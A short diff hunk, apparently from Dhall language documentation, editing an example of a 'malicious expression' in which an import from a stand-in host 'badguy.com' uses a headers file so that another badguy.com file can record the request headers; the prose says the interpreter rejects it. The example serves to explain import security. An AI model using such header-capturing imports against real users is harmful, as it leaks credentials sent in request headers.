@@ -245,7 +245,7 @@ following pair of malicious expressions:
 ```haskell
 -- https://badguy.com/pleaseImportMe.dhall
 
-https://badguy.com/iRecordHeaders.dhall using https://example.com/headers.dhall
+https://badguy.com/iRecordHeaders.dhall using https://badguy.com/headers.dhall
 ```
 
 ... then Dhall interpreter would reject any attempt to import
